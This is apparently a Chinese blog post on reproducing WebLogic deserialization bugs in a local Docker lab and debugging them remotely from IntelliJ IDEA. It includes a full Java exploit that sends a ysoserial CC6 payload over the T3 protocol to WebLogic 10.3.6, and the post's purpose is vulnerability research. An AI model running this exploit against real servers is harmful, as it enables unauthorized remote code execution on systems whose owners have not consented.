---
title: "IDEA +docker远程调试weblogic"
onlyTitle: true
date: 2024-11-25 23:03:32
categories:
- java
- java杂谈
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8118.jpg
---

抄一个IDEA docker的远程调试，复现weblogic被整的大脑偏瘫



## vulhub版环境搭建

https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271

首先将docker的8453开启

修改docker-compose.yml

```yaml
version: '2'
services:
 weblogic:
   image: vulhub/weblogic
   ports:
    - "7001:7001"
    - "8453:8453"
```

然后运行docker-compose up -d 下载和运行镜像。

 

下载完成后

使用`docker exec -it weblogic /bin/bash` 进入容器，修改`/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh`

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031174834776-898289365.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031174834776-898289365.png)

 添加两行代码

```sh
debugFlag="true"
export debugFlag 
```

然后`docker restart 容器id`

 

因为需要weblogic的源码，所以我们把 weblogic的源码和jdk包都拷贝出来。

`docker cp weblogic:/root ./weblogic_jars`

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175023249-413470801.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175023249-413470801.png)

然后idea打开`/root/Oracle/Middleware/wlserver_10.3/`目录

如图

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175129518-1227494194.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175129518-1227494194.png)

然后使用命令把Middleware目录下所有的*.jar包都放在一个test的文件夹里。

命令如下：

`find ./ -name *.jar -exec cp {} ./test/ \;`

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175246338-402360036.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175246338-402360036.png)

然后在libraries下添加test目录

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175324633-1279780349.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175324633-1279780349.png)

在jdk这块选用weblogic10.3.6自带的jdk6

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175401969-1626244476.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175401969-1626244476.png)

 都增加以后

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175418941-438835508.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175418941-438835508.png)

这块就会出现两个目录。

然后我们添加远程服务器。

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175459102-1115823273.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175459102-1115823273.png)

 端口号是8453

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175516574-482328806.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175516574-482328806.png)

 然后应用，开启debug

当console出现下面图片时候，说明可以了。

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175606211-1788033283.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175606211-1788033283.png)

然后在`/wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class`的129行下断点

*[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175732510-274443972.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175732510-274443972.png)*

burp在wls-wsat进行发包

当出现下图时，说明成功了。

[![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/650236-20191031175806877-931381151.png)](https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175806877-931381151.png)

 



## QAX-A-Team版环境搭建

按照如下文档搭建好weblogic 并运行docker后

https://github.com/QAX-A-Team/WeblogicEnvironment

直接把weblogic安装包那个jar的modules提到IDEA库下面

然后配置里远程调试

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225835517.png)



自己写了个打weblogic 10.3.6的CC6

```java
package org.exploit.Weblogic;

import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

public class WebLogicExploit {

    // Function to generate payload using ysoserial
    public static byte[] generatePayload() throws IOException {
        String filePath = "cc6.ser";

        byte[] payload = new byte[0];
        try {
            // 读取二进制文件
            payload = Files.readAllBytes(Paths.get(filePath));

        } catch (IOException e) {
            e.printStackTrace();
        }
        return payload;
    }

    // Function to send the exploit payload over T3 protocol
    public static void T3Exploit(String ip, int port, byte[] payload) throws IOException {
        Socket socket = new Socket(ip, port);
        OutputStream outputStream = socket.getOutputStream();
        InputStream inputStream = socket.getInputStream();
        
        // Send T3 handshake
        String handshake = "t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n";
        outputStream.write(handshake.getBytes(StandardCharsets.UTF_8));
        outputStream.flush();
        
        // Read response from the server
        byte[] response = new byte[1024];
        int len = inputStream.read(response);
        String responseData = new String(response, 0, len, StandardCharsets.UTF_8);

        // Check if it's WebLogic server
        Pattern pattern = Pattern.compile("HELO");
        Matcher matcher = pattern.matcher(responseData);
        if (matcher.find()) {
            System.out.println("WebLogic");
        } else {
            System.out.println("Not WebLogic");
            socket.close();
            return;
        }
        
        // Construct the full payload with headers and exploit data
        byte[] header = hexStringToByteArray("00000000");
        byte[] t3Header = hexStringToByteArray("016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006");
        byte[] desFlag = hexStringToByteArray("fe010000");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(t3Header);
        byteArrayOutputStream.write(desFlag);
        byteArrayOutputStream.write(payload);

        byte[] fullPayload = byteArrayOutputStream.toByteArray();

        // Set the length in the correct place
        byte[] lengthPrefix = new byte[4];
        for (int i = 0; i < 4; i++) {
            lengthPrefix[i] = (byte) ((fullPayload.length >> (8 * (3 - i))) & 0xFF);
        }
        
        // Send the payload
        outputStream.write(lengthPrefix);
        outputStream.write(fullPayload, 4, fullPayload.length - 4);
        outputStream.flush();
        
        socket.close();
    }

    // Helper function to convert hex string to byte array
    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }

    public static void main(String[] args) {
        String ip = "192.168.152.128";
        int port = 7001;

        try {
            // Generate the payload
            byte[] payload = generatePayload();
            
            // Exploit WebLogic server
            T3Exploit(ip, port, payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

可以看到可以调试

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225921150.png)



`docker images`查看docker id

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215119331.png)

不对，我真是脑残啊我，`docker ps`查看正在运行的容器id

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125215725487.png)

进入容器：`docker exec -it 1985c4752c41 /bin/bash`

即可查看是否打成功

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125230040660.png)





参考：https://www.cnblogs.com/ph4nt0mer/p/11772709.html

